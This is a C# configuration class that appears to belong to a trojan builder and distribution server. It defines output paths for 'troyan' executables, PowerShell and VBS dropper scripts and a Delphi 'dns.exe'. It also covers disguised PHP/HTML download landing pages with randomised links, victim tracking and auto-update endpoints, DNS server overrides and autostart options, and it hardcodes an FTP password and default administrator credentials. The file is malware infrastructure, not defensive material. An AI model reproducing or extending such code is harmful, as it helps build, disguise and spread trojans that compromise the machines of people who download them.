using System.Text.Json.Serialization;

namespace model;

public class ServerModel
{
    [JsonPropertyName("urlDoc")] public string UrlDoc { get; set; } = "";
    
    [JsonPropertyName("disabled")] public bool Disabled { get; set; } = false;
        
    [JsonPropertyName("disableVirus")] public bool DisableVirus { get; set; } = false;
        
    [JsonPropertyName("tabs"), JsonIgnore]
    public List<TabModel> Tabs { get; set; }
        
    [JsonPropertyName("bux")]
    public List<BuxModel> Bux { get; set; }
        
    [JsonPropertyName("dnSponsor")]
    public List<DnSponsorModel> DnSponsor { get; set; }
        
    private string _landingName;
        
    [JsonPropertyName("landingAuto")]
    public bool LandingAuto { get; set; }

    [JsonPropertyName("landingName")]
    public string LandingName
    {
        get
        {
            if (string.IsNullOrEmpty(_landingName))
                _landingName = "default";
            return _landingName;
        }
        set { _landingName = value; }
    }
        
    [JsonPropertyName("landingFtp")]
    public string LandingFtp { get; set; }
       
    [JsonPropertyName("sourceCertDir")] public string SourceCertDir => ServerModelLoader.SourceCertDirStatic;
    // statics
    [JsonPropertyName("rootDir")] public string RootDir => ServerModelLoader.RootDirStatic;

    [JsonPropertyName("domainController")]
    public string DomainController => ServerModelLoader.DomainControllerStatic;

    [JsonPropertyName("cpDir")] public string CpDir => ServerModelLoader.CpDirStatic;
    [JsonPropertyName("certDir")] public string CertDir => ServerModelLoader.CertDirStatic;
    [JsonPropertyName("phpDir")] public string PhpDir => ServerModelLoader.PhpDirStatic;
    [JsonPropertyName("phpTemplateFile")] public string PhpTemplateFile => Path.Join(PhpDir, ".\\dn.php");
    [JsonPropertyName("phpTemplateSponsorFile")] public string PhpTemplateSponsorFile => Path.Join(PhpDir, ".\\download.php");
    [JsonPropertyName("htmlTemplateSponsorFile")] public string HtmlTemplateSponsorFile => Path.Join(PhpDir, ".\\download.html");
    [JsonPropertyName("sysDir")] public string SysDir => ServerModelLoader.SysDirStatic;
    [JsonPropertyName("adsDir")] public string AdsDir => ServerModelLoader.AdsDirStatic;
    [JsonPropertyName("publishedAdsDir")] public string PublishedAdsDir => ServerModelLoader.PublishedAdsDirStatic;
    [JsonPropertyName("publishedDir")] public string PublishedDir => ServerModelLoader.PublishedDirStatic;
        
    public string UpdateFile  { get; set; }
        
    [JsonPropertyName("troyanDir")] public string TroyanDir => ServerModelLoader.TroyanDirStatic;
    [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => ServerModelLoader.TroyanScriptDirStatic;
    [JsonPropertyName("troyanOutputDir")] public string TroyanOutputDir => Path.Join(TroyanDir, @".\_output");

    [JsonPropertyName("troyanHolder")] public string TroyanHolder => Path.Join(TroyanOutputDir, "troyan_holder.ps1");
    [JsonPropertyName("troyanHolderClean")] public string TroyanHolderClean => Path.Join(TroyanOutputDir, "troyan_holder.c.ps1");
    [JsonPropertyName("troyanExe")] public string TroyanExe => Path.Join(TroyanOutputDir, "troyan.exe");
    [JsonPropertyName("troyanIco")] public string TroyanIco => Path.Join(TroyanOutputDir, "troyan.ico");
    [JsonPropertyName("troyanOutputBlock")] public string TroyanOutputBlock => Path.Join(TroyanOutputDir, @".\block");
        
    [JsonPropertyName("userTroyanBlock")] public string UserTroyanMono => Path.Join(UserDataDir, @".\block");
    [JsonPropertyName("userTroyanExe")] public string UserTroyanExe => Path.Join(UserDataDir, "troyan.exe");
    [JsonPropertyName("userTroyanIco")] public string UserTroyanIco => Path.Join(UserDataDir, "troyan.ico");
        
        
    [JsonPropertyName("troyanBody")] public string TroyanBody => Path.Join(TroyanOutputDir, "troyan_body.ps1");
    [JsonPropertyName("troyanBodyClean")] public string TroyanBodyClean => Path.Join(TroyanOutputDir, "troyan_body.c.ps1");
    [JsonPropertyName("userTroyanBody")] public string UserTroyanBody => Path.Join(UserDataDir, "troyan_body.txt");
        
    [JsonPropertyName("troyanExeMono")] public string TroyanExeMono => Path.Join(TroyanOutputDir, "troyan_mono.exe");
    [JsonPropertyName("userTroyanExeMono")] public string UserTroyanExeMono => Path.Join(UserDataDir, "troyan_mono.exe");
    [JsonPropertyName("troyanHolderMono")] public string TroyanHolderMono => Path.Join(TroyanOutputDir, "troyan_holder_mono.ps1");
    [JsonPropertyName("troyanHolderCleanMono")] public string TroyanHolderCleanMono => Path.Join(TroyanOutputDir, "troyan_holder_mono.c.ps1");
       
        
    [JsonPropertyName("troyanVbsDir")] public string TroyanVbsDir => ServerModelLoader.TroyanVbsDirStatic;
    [JsonPropertyName("troyanVbsFile")] public string TroyanVbsFile => Path.Join(TroyanOutputDir, "troyan.vbs");
    [JsonPropertyName("userVbsFile")] public string UserVbsFile => Path.Join(UserDataDir, "troyan.vbs");
    [JsonPropertyName("userVbsFileClean")] public string UserVbsFileClean => Path.Join(UserDataDir, "troyan.c.vbs");
        
    [JsonPropertyName("defaultIco")] public string DefaultIco => Path.Join(RootDir, "defaulticon.ico");
        
        
    [JsonPropertyName("troyanDelphiDir")] public string TroyanDelphiDir => ServerModelLoader.TroyanDelphiDirStatic;
    [JsonPropertyName("troyanDelphiExe")] public string TroyanDelphiExe => Path.Join(TroyanDelphiDir, "dns.exe");
    [JsonPropertyName("troyanDelphiProj")] public string TroyanDelphiProj => Path.Join(TroyanDelphiDir, "dns.dpr");
    [JsonPropertyName("troyanDelphiIco")] public string TroyanDelphiIco => Path.Join(TroyanDelphiDir, "_icon.ico");
        


    // server-depended
    [JsonPropertyName("server")] public string Server { get; set; }
    [JsonPropertyName("alias")] public string Alias { get; set; }
        
    [JsonPropertyName("strahServer")] public string StrahServer { get; set; }
    [JsonPropertyName("userDataDir")] public string UserDataDir => @$"C:\data\{Server}";
    [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
    [JsonPropertyName("userDelphiExe")] public string UserDelphiPath => Path.Join(UserDataDir, "troyan.exe");
    [JsonPropertyName("userDelphiIco")] public string UserDelphiIco => Path.Join(UserDataDir, "server.ico");
        

        
    public string Random()
    {
        return VbsRandomer.GenerateRandomVariableName(10);
    }
        
    [JsonPropertyName("dnVbsLinkShort")] public string DnVbsLinkShort => $"/default/{Random()}/none/GetVbs";
    [JsonPropertyName("dnVbsLink")] public string DnVbsLink => $"http://{Alias}/{DnVbsLinkShort}";
    [JsonPropertyName("phpVbsLinkShort")] public string PhpVbsLinkShort => $"/default/GetVbsPhp";
       
        
    [JsonPropertyName("userPhpVbsFile")] public string UserPhpVbsFile => Path.Join(UserDataDir, $"{DownloadIdentifier}.php");
    [JsonPropertyName("userSponsorPhpVbsFile")] public string UserSponsorPhpVbsFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-sponsor.php");
    [JsonPropertyName("userSponsorHtmlVbsFile")] public string UserSponsorHtmlVbsFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-sponsor.html");
    
    [JsonPropertyName("userPhpExeFile")] public string UserPhpExeFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-exe.php");
    [JsonPropertyName("userSponsorPhpExeFile")] public string UserSponsorPhpExeFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-sponsor-exe.php");
    [JsonPropertyName("userSponsorHtmlExeFile")] public string UserSponsorHtmlExeFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-sponsor-exe.html");

    [JsonPropertyName("downloadIdentifier")]
    public string DownloadIdentifier
    {
        get
        {
            if (!string.IsNullOrEmpty(LandingName))
                return LandingName;
            return "download";
        }
    }
        
    //FTP
    [JsonPropertyName("ftp")] public string Ftp => $@"ftp://ftpData:Abc12345!@{Server}";
    [JsonPropertyName("ftpAsHttp")] public string FtpAsHttp => $@"http://{Server}/ftp";
        
        
    //Update
    [JsonPropertyName("updateUrl")]
    public string UpdateUrl 
    { 
        get
        {
            var result = "http://";
            if (!string.IsNullOrEmpty(Alias))
                result += Alias;
            else
            {
                result += Server;
            }
            result += "/update";
            return result;
        }
    }
        
    //Update
    [JsonPropertyName("updateUrlFolder")]
    public string UpdateUrlFolder 
    { 
        get
        {
            var result = "http://";
            if (!string.IsNullOrEmpty(Alias))
                result += Alias;
            else
            {
                result += Server;
            }
            result += $"/data/";
            return result;
        }
    }
        
    //Update
    [JsonPropertyName("updateUrlBlock")]
    public string UpdateUrlMono
    { 
        get
        {
            return UpdateUrlFolder + "block/";
        }
    }

    // properties
    [JsonPropertyName("login")] public string Login { get; set; }

    [JsonPropertyName("password")] public string Password { get; set; }

    [JsonPropertyName("primaryDns")] public string PrimaryDns { get; set; }

    [JsonPropertyName("secondaryDns")] public string SecondaryDns { get; set; }

    [JsonPropertyName("track")] public bool Track { get; set; }

    [JsonPropertyName("trackSerie")] public string TrackSerie { get; set; }
        
    [JsonPropertyName("trackDesktop")] public bool TrackDesktop { get; set; }

    [JsonPropertyName("trackUrl")]
    public string TrackUrl
    {
        get
        {
            var result = "http://";
            if (!string.IsNullOrEmpty(Alias))
            {
                result += Alias;
            }
            else
            {
                result += Server;
            }
            result += "/upsert";
            return result;
        }
    }
        
    [JsonPropertyName("autoStart")] public bool AutoStart { get; set; }

    [JsonPropertyName("autoUpdate")] public bool AutoUpdate { get; set; }

    [JsonPropertyName("domains")] public List<string> Domains { get; set; }

    [JsonPropertyName("interfaces")] public List<string> Interfaces { get; set; }

    [JsonPropertyName("ipDomains")] public Dictionary<string, string> IpDomains { get; set; }

    [JsonPropertyName("pushesForce")] public bool PushesForce { get; set; } = true;
    [JsonPropertyName("pushes")] public List<string> Pushes { get; set; }
        
    [JsonPropertyName("startDownloadsForce")] public bool StartDownloadsForce { get; set; }
    [JsonPropertyName("startDownloads")] public List<string> StartDownloads { get; set; }

    [JsonPropertyName("startUrlsForce")] public bool StartUrlsForce { get; set; }
    [JsonPropertyName("startUrls")] public List<string> StartUrls { get; set; }

    [JsonPropertyName("frontForce")] public bool FrontForce { get; set; }
    [JsonPropertyName("front")] public List<string> Front { get; set; }

    [JsonPropertyName("extractIconFromFront")]
    public bool ExtractIconFromFront { get; set; }

    [JsonPropertyName("embeddingsForce")] public bool EmbeddingsForce { get; set; }
    [JsonPropertyName("embeddings")] public List<string> Embeddings { get; set; }


    //resulting
    [JsonPropertyName("adminServers")]
    [JsonIgnore]
    public Dictionary<string, string>? AdminServers { get; set; }

    [JsonPropertyName("adminPassword")]
    [JsonIgnore]
    public string AdminPassword { get; set; }

    [JsonIgnore] public string? Result { get; set; }

    [JsonPropertyName("isValid")] public bool IsValid { get; set; }
        
    [JsonPropertyName("extraUpdate")] public bool ExtraUpdate { get; set; }
    [JsonPropertyName("extraUpdateUrl")] public string ExtraUpdateUrl { get; set; }

    //constructor
    public ServerModel()
    {
        IsValid = false;
        Server = "1.1.1.1";
        Login = "Administrator";
        Password = "password";
        Track = false;
        AutoStart = false;
        AutoUpdate = false;
        Domains = new List<string>();
        StartUrls = new List<string>();
        StartDownloads = new List<string>();
        Interfaces = new List<string>();
        Pushes = new List<string>();
        IpDomains = new();
        Front = new List<string>();
        ExtractIconFromFront = false;
        Embeddings = new List<string>();
        Tabs = new List<TabModel>();
        Bux = new List<BuxModel>();
        DnSponsor = new List<DnSponsorModel>();
    }
}